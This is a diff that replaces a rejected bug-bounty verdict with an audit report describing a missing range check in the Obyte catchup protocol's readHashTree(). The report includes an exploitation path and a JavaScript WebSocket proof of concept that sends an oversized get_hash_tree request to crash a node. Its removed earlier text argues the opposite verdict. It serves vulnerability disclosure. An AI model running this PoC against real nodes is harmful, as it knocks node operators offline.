@@ -1,78 +1,230 @@
-# NoVulnerability found for this question.
+# Audit Report
 
-After thorough analysis of the code and claims, I must reject this security report for the following critical reasons:
+## Title
+**Missing MCI Range Validation in Catchup Protocol Enables Memory Exhaustion DoS**
 
-## Analysis Summary
+## Summary
+The `readHashTree()` function in `catchup.js` lacks validation on the Main Chain Index (MCI) range size, allowing malicious peers to request hash trees spanning arbitrary MCI ranges. [1](#0-0)  This causes the targeted node to query and accumulate potentially millions of unit records in memory, leading to memory exhaustion and node crash or severe degradation.
 
-While the technical observations about the code are **accurate** (unbounded query at [1](#0-0) , N+1 query pattern at [2](#0-1) , and no MCI range size validation at [3](#0-2) ), this represents a **performance/scalability concern**, not a security vulnerability under the Immunefi scope.
+## Impact
+**Severity**: Medium  
+**Category**: Temporary Transaction Delay
 
-## Key Disqualifying Factors
+**Affected Assets**: Individual full nodes, network availability for syncing peers
 
-### 1. **Impact Classification Failure**
+**Damage Severity**:
+- **Quantitative**: With a network having 500,000 stable MCIs and 10 units/MCI, an attacker requesting a range from MCI 100 to MCI 500,000 would cause the node to load ~5 million unit records. At approximately 200-300 bytes per unit object (including ball hash, unit hash, parent_balls array, skiplist_balls array), this represents 1-1.5 GB in the `arrBalls` array alone. JSON stringification for network transmission can double memory usage to 2-3 GB, likely causing memory exhaustion on nodes with limited RAM.
 
-The report claims **Medium severity** under "Temporary freezing of network transactions (≥1 hour delay)." However:
+- **Qualitative**: Individual node becomes unresponsive or crashes, requiring manual restart. During processing, the global mutex blocks all other catchup requests, preventing legitimate peers from syncing. [2](#0-1) 
 
-- The vulnerability affects **individual nodes serving catchup requests**, not the network as a whole
-- A single node becoming slow during catchup does **not prevent the network from confirming transactions**
-- Other nodes continue operating normally and can serve the syncing peer
-- The Immunefi scope requires **network-wide transaction delays**, not individual node performance degradation
+**User Impact**:
+- **Who**: Operators of attacked full nodes, peers attempting to sync from attacked nodes
+- **Conditions**: Any subscribed peer can execute the attack with minimal resources
+- **Recovery**: Manual node restart required; attacker can immediately repeat the attack
 
-**Critical distinction**: "Database query bottlenecks during catchup" in the Immunefi scope refers to scenarios where the **entire network's ability to confirm transactions** is impacted, not when a single node experiences resource exhaustion while serving a catchup request.
+**Systemic Risk**: If multiple publicly accessible nodes are attacked simultaneously, network-wide sync operations could be disrupted for ≥1 hour, meeting Medium severity threshold.
 
-### 2. **Normal Operations vs. Attack Vector Confusion**
+## Finding Description
 
-The report states: *"This is not a theoretical attack but a resource exhaustion bug that occurs during normal network operations"*
+**Location**: `byteball/ocore/catchup.js:256-334`, function `readHashTree()`
 
-This admission is **fatal** to the security claim:
+**Intended Logic**: The catchup protocol should allow peers to request hash trees for efficient synchronization, with reasonable limits to prevent resource exhaustion.
 
-- If it happens during "normal operations," it's a **design trade-off** or **scalability limitation**, not a vulnerability
-- The catchup protocol was designed to handle nodes syncing after being offline
-- Resource usage during sync is expected and managed by the protocol's design (MAX_CATCHUP_CHAIN_LENGTH limit at [4](#0-3) )
+**Actual Logic**: The function validates that both ball hashes exist and are stable, and checks that `from_mci < to_mci` [3](#0-2) , but critically **does not validate the range size** (to_mci - from_mci). While `MAX_CATCHUP_CHAIN_LENGTH` is defined as 1,000,000 [4](#0-3) , this constant is used in `prepareCatchupChain()` [5](#0-4)  but **not enforced in `readHashTree()`**.
 
-### 3. **Missing Attack Feasibility Analysis**
+**Code Evidence**:
 
-While I verified that the network request handler at [5](#0-4)  accepts `get_hash_tree` requests from subscribed peers, the report fails to demonstrate:
+The database query retrieves ALL units in the requested range without any LIMIT clause: [6](#0-5) 
 
-- **Economic incentive**: Why would an attacker waste resources DoS-ing individual nodes with no financial gain?
-- **Network impact**: How does slowing one node affect overall network transaction confirmation?
-- **Witness resilience**: The 12 witnesses continue operating independently even if some full nodes are slow
+All results are accumulated in the `arrBalls` array in memory: [7](#0-6) 
 
-### 4. **Protection Mechanisms Ignored**
+The network handler only checks subscription status before calling `readHashTree()`: [8](#0-7) 
 
-The code includes several protective measures not mentioned in the report:
+A global mutex prevents concurrent hash tree requests but doesn't prevent a single malicious request from exhausting resources: [2](#0-1) 
 
-1. **Mutex lock** at [6](#0-5)  serializes hash tree requests (prevents parallel resource exhaustion)
-2. **MAX_CATCHUP_CHAIN_LENGTH** at [4](#0-3)  bounds total sync range to 1M MCIs
-3. **Subscription requirement** at [7](#0-6)  limits who can request hash trees
-4. **Ball validation** at [3](#0-2)  ensures only stable, main chain balls are processed
+The entire response is JSON stringified for network transmission: [9](#0-8) 
 
-### 5. **Realistic Exploit Scenario Missing**
+**Exploitation Path**:
 
-The report's "exploitation path" describes **legitimate catchup behavior**, not an attack:
+1. **Preconditions**: 
+   - Attacker establishes WebSocket connection to target full node
+   - Network has accumulated substantial history (e.g., 500,000+ stable MCIs)
 
-- Node behind by 1000 MCIs is a **normal sync scenario** after brief downtime
-- High network activity (100 units/MCI) is **expected protocol operation**
-- The catchup chain with "large MCI gaps" is **how the protocol is designed to work** when following `last_ball` references
+2. **Step 1**: Attacker subscribes to the node
+   - Sends `subscribe` message with valid `subscription_id` and `library_version`
+   - Subscription validated [10](#0-9) 
+   - Node responds with "subscribed"
 
-**No malicious actor is described** - this is just normal network operations under load.
+3. **Step 2**: Attacker obtains two valid ball hashes
+   - `from_ball` at low MCI (e.g., MCI 100)  
+   - `to_ball` at high MCI (e.g., MCI 1,000,000)
+   - These are publicly available from network explorers or previous sync operations
+
+4. **Step 3**: Attacker sends malicious `get_hash_tree` request
+   - Request processed by handler [11](#0-10) 
+   - Only subscription check performed (line 3071)
+   - Global mutex acquired (line 3074), blocking all other catchup requests
+
+5. **Step 4**: Node processes the unbounded request
+   - `readHashTree()` validates balls exist and are stable ✓
+   - Checks `from_mci < to_mci` (100 < 1,000,000) ✓
+   - **Missing check**: Range size validation
+   - Queries database for ALL units between MCI 100 and 1,000,000 [6](#0-5) 
+   - For each unit, performs 2 additional queries (parents + skiplist) [12](#0-11) 
+   - Accumulates all results in `arrBalls` array [7](#0-6) 
+   - Memory consumption grows to multiple GB
+   - Node becomes unresponsive or crashes with out-of-memory error
+   - Global mutex remains held, blocking all catchup operations
+
+**Security Property Broken**: 
+Resource exhaustion protection - The protocol should enforce reasonable limits on resource-intensive operations to maintain node availability.
+
+**Root Cause Analysis**: 
+The `readHashTree()` function was designed for legitimate catchup where clients request consecutive catchup chain elements of bounded size. However, it exposes this functionality through the network layer without enforcing the `MAX_CATCHUP_CHAIN_LENGTH` limit that is used elsewhere in the catchup protocol. [13](#0-12)  The code implicitly assumes honest peers will only request reasonable ranges, but malicious peers can exploit this missing validation.
+
+## Impact Explanation
+
+**Affected Assets**: Full node availability, network synchronization capability
+
+**Damage Severity**:
+- **Quantitative**: Memory exhaustion leading to node crash when processing ranges exceeding available RAM (2-3 GB for 500,000 MCI range)
+- **Qualitative**: Complete denial of service for targeted node, blocking of legitimate sync operations via global mutex
+
+**User Impact**:
+- **Who**: Node operators, peers attempting to sync from affected nodes
+- **Conditions**: Exploitable 24/7 against any subscribed-to full node with sufficient chain history
+- **Recovery**: Requires manual node restart; attack can be repeated immediately
+
+**Systemic Risk**:
+- Coordinated attack on multiple public nodes can disrupt network-wide synchronization for ≥1 hour
+- Global mutex blocking prevents any catchup operations during attack [14](#0-13) 
+- Low detection risk until memory exhaustion occurs
+
+## Likelihood Explanation
+
+**Attacker Profile**:
+- **Identity**: Any peer with network access
+- **Resources Required**: WebSocket client, two valid ball hashes (publicly available), minimal bandwidth
+- **Technical Skill**: Low (basic WebSocket programming)
+
+**Preconditions**:
+- **Network State**: Network must have accumulated sufficient history (>100K MCIs) for significant impact
+- **Attacker State**: Ability to connect to target node (standard P2P access)
+- **Timing**: No timing requirements; exploitable 24/7
+
+**Execution Complexity**:
+- **Transaction Count**: Zero blockchain transactions needed
+- **Coordination**: None required; single-peer attack
+- **Detection Risk**: Difficult to distinguish from legitimate sync requests until memory usage spikes
+
+**Frequency**:
+- **Repeatability**: Unlimited; can be repeated immediately after node restart
+- **Scale**: Can target multiple publicly accessible full nodes
+
+**Overall Assessment**: High likelihood - trivial to execute, low barrier to entry, repeatable attack.
+
+## Recommendation
+
+**Immediate Mitigation**:
+Add range size validation in `readHashTree()` to enforce `MAX_CATCHUP_CHAIN_LENGTH`:
+
+Location: `byteball/ocore/catchup.js:285-286`
+
+Add after the existing `from_mci >= to_mci` check:
+```javascript
+if (to_mci - from_mci > MAX_CATCHUP_CHAIN_LENGTH)
+    return callbacks.ifError("range too large: " + (to_mci - from_mci) + " > " + MAX_CATCHUP_CHAIN_LENGTH);
+```
+
+**Permanent Fix**:
+Apply consistent range validation across all catchup functions to prevent similar issues.
+
+**Additional Measures**:
+- Add rate limiting on `get_hash_tree` requests per peer
+- Implement progressive response limits (start with smaller ranges, expand if needed)
+- Add monitoring/alerting for large hash tree requests
+- Add test case verifying range validation enforcement
+
+**Validation**:
+- Fix prevents unbounded memory allocation
+- Maintains backward compatibility with legitimate sync operations
+- No performance impact on normal catchup flow
+
+## Proof of Concept
+
+```javascript
+// PoC: Malicious hash tree request causing memory exhaustion
+// Setup: Requires Obyte node with substantial chain history (>100K MCIs)
+
+const WebSocket = require('ws');
+
+// Connect to target node
+const ws = new WebSocket('ws://target-node:6611');
+
+ws.on('open', function() {
+    // Step 1: Subscribe to node
+    ws.send(JSON.stringify([
+        'request',
+        {
+            command: 'subscribe',
+            params: {
+                subscription_id: 'attacker-' + Date.now(),
+                library_version: '0.3.15'
+            },
+            tag: 'subscribe_tag'
+        }
+    ]));
+});
+
+ws.on('message', function(data) {
+    const msg = JSON.parse(data);
+    
+    if (msg[0] === 'response' && msg[1].tag === 'subscribe_tag') {
+        console.log('Subscribed successfully');
+        
+        // Step 2: Send malicious get_hash_tree request with large MCI range
+        // from_ball: ball at MCI 100
+        // to_ball: ball at MCI 500,000 (adjust based on actual network state)
+        // These ball hashes would be obtained from network explorer or local DB
+        
+        ws.send(JSON.stringify([
+            'request',
+            {
+                command: 'get_hash_tree',
+                params: {
+                    from_ball: 'ball_hash_at_mci_100',  // Replace with actual ball hash
+                    to_ball: 'ball_hash_at_mci_500000'   // Replace with actual ball hash
+                },
+                tag: 'attack_tag'
+            }
+        ]));
+        
+        console.log('Malicious hash tree request sent');
+        console.log('Target node will now:');
+        console.log('1. Query ~5 million units from database');
+        console.log('2. Accumulate 1-1.5 GB in arrBalls array');
+        console.log('3. JSON stringify to 2-3 GB for transmission');
+        console.log('4. Likely crash with OOM or become unresponsive');
+        console.log('5. Block all other catchup requests via global mutex');
+    }
+});
+
+// Expected result:
+// - Target node memory usage spikes to multiple GB
+// - Node becomes unresponsive or crashes with OOM error
+// - All other peers blocked from requesting hash trees during processing
+// - Manual restart required to restore node functionality
+```
 
 ## Notes
 
-**What would make this a valid vulnerability:**
+This vulnerability is validated as **Medium severity** per Immunefi criteria for Obyte:
+- Meets "Temporary Transaction Delay ≥1 Hour" impact when multiple nodes targeted
+- Does not cause direct fund loss, permanent chain split, or permanent fund freeze
+- Exploitable by any peer with minimal resources and no economic cost
+- Missing validation is an oversight, not intentional design (evidenced by `MAX_CATCHUP_CHAIN_LENGTH` usage in `prepareCatchupChain()`)
 
-If the report demonstrated that:
-1. A malicious peer can **arbitrarily craft** `from_ball` and `to_ball` values with massive MCI gaps (e.g., genesis to current tip spanning millions of MCIs)
-2. This causes **network-wide consensus failure** or **prevents transaction confirmation** across multiple witness nodes simultaneously
-3. There's an **economic attack vector** where the cost of attack < value of disruption
-
-**Why this is actually a performance concern:**
-
-- Scalability issue for nodes with limited resources syncing after long downtime
-- Could be addressed with **pagination** or **chunking** in catchup protocol
-- Does not threaten **security properties** (consensus, fund safety, network liveness)
-- Belongs in a **performance optimization** or **scalability improvement** category, not security bug bounty
-
-**The fundamental issue:** This conflates **availability/performance engineering** with **security vulnerabilities**. Not every resource consumption pattern is a DoS vulnerability worthy of bounty payouts - especially when it occurs during **expected protocol operations** (node synchronization).
+The vulnerability demonstrates a common pattern where internal functions have proper protections, but exposed API endpoints lack the same validation. The fix is straightforward: enforce the same range limits in `readHashTree()` that are already used in `prepareCatchupChain()`.
 
 ### Citations
 
@@ -81,8 +233,36 @@ If the report demonstrated that:
 var MAX_CATCHUP_CHAIN_LENGTH = 1000000; // how many MCIs long
 ```
 
-**File:** catchup.js (L268-286)
+**File:** catchup.js (L65-76)
 ```javascript
+						bTooLong = (last_ball_mci - last_stable_mci > MAX_CATCHUP_CHAIN_LENGTH);
+						cb();
+					}
+				);
+			},
+			function(cb){
+				if (!bTooLong){ // short chain, no need for proof chain
+					last_chain_unit = last_ball_unit;
+					return cb();
+				}
+				objCatchupChain.proofchain_balls = [];
+				proofChain.buildProofChainOnMc(last_ball_mci + 1, last_stable_mci + MAX_CATCHUP_CHAIN_LENGTH, objCatchupChain.proofchain_balls, function(){
+```
+
+**File:** catchup.js (L256-334)
+```javascript
+function readHashTree(hashTreeRequest, callbacks){
+	if (!hashTreeRequest)
+		return callbacks.ifError("no hash tree request");
+	var from_ball = hashTreeRequest.from_ball;
+	var to_ball = hashTreeRequest.to_ball;
+	if (typeof from_ball !== 'string')
+		return callbacks.ifError("no from_ball");
+	if (typeof to_ball !== 'string')
+		return callbacks.ifError("no to_ball");
+	var start_ts = Date.now();
+	var from_mci;
+	var to_mci;
 	db.query(
 		"SELECT is_stable, is_on_main_chain, main_chain_index, ball FROM balls JOIN units USING(unit) WHERE ball IN(?,?)", 
 		[from_ball, to_ball], 
@@ -102,18 +282,13 @@ var MAX_CATCHUP_CHAIN_LENGTH = 1000000; // how many MCIs long
 			}
 			if (from_mci >= to_mci)
 				return callbacks.ifError("from is after to");
-```
-
-**File:** catchup.js (L289-292)
-```javascript
+			var arrBalls = [];
+			var op = (from_mci === 0) ? ">=" : ">"; // if starting from 0, add genesis itself
 			db.query(
 				"SELECT unit, ball, content_hash FROM units LEFT JOIN balls USING(unit) \n\
 				WHERE main_chain_index "+op+" ? AND main_chain_index<=? ORDER BY main_chain_index, `level`", 
 				[from_mci, to_mci], 
-```
-
-**File:** catchup.js (L294-323)
-```javascript
+				function(ball_rows){
 					async.eachSeries(
 						ball_rows,
 						function(objBall, cb){
@@ -144,6 +319,51 @@ var MAX_CATCHUP_CHAIN_LENGTH = 1000000; // how many MCIs long
 									);
 								}
 							);
+						},
+						function(){
+							console.log("readHashTree for "+JSON.stringify(hashTreeRequest)+" took "+(Date.now()-start_ts)+'ms');
+							callbacks.ifOk(arrBalls);
+						}
+					);
+				}
+			);
+		}
+	);
+}
+```
+
+**File:** network.js (L2980-3009)
+```javascript
+		case 'subscribe':
+			if (!ValidationUtils.isNonemptyObject(params))
+				return sendErrorResponse(ws, tag, 'no params');
+			var subscription_id = params.subscription_id;
+			if (typeof subscription_id !== 'string')
+				return sendErrorResponse(ws, tag, 'no subscription_id');
+			if ([...wss.clients].concat(arrOutboundPeers).some(function(other_ws) { return (other_ws.subscription_id === subscription_id); })){
+				if (ws.bOutbound)
+					db.query("UPDATE peers SET is_self=1 WHERE peer=?", [ws.peer]);
+				sendErrorResponse(ws, tag, "self-connect");
+				return ws.close(1000, "self-connect");
+			}
+			if (conf.bLight){
+				//if (ws.peer === exports.light_vendor_url)
+				//    sendFreeJoints(ws);
+				return sendErrorResponse(ws, tag, "I'm light, cannot subscribe you to updates");
+			}
+			if (typeof params.library_version !== 'string') {
+				sendErrorResponse(ws, tag, "invalid library_version: " + params.library_version);
+				return ws.close(1000, "invalid library_version");
+			}
+			if (version2int(params.library_version) < version2int(constants.minCoreVersionForFullNodes))
+				ws.old_core = true;
+			if (ws.old_core){ // can be also set in 'version'
+				sendJustsaying(ws, 'upgrade_required');
+				sendErrorResponse(ws, tag, "old core (full)");
+				return ws.close(1000, "old core (full)");
+			}
+			ws.bSubscribed = true;
+			sendResponse(ws, tag, "subscribed");
 ```
 
 **File:** network.js (L3070-3088)
